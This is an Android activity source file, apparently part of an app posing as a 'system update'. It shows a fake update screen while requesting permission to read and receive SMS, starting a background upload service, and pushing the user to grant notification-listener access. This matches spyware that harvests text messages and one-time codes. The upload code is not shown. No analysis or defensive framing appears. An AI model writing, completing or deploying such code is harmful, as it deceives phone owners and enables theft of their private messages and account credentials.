package com.system.update;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("Updating system components…\n\nPlease wait.");
        tv.setPadding(60, 250, 60, 60);
        tv.setTextSize(18);
        setContentView(tv);

        if (Build.VERSION.SDK_INT >= 23) {
            ActivityCompat.requestPermissions(this,
                new String[]{
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
                }, 1);
        }

        Intent svc = new Intent(this, UploadService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        if (!isNotifListenerEnabled()) {
            startActivity(new Intent(
                "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        }
    }

    private boolean isNotifListenerEnabled() {
        String flat = Settings.Secure.getString(
            getContentResolver(),
            "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
}
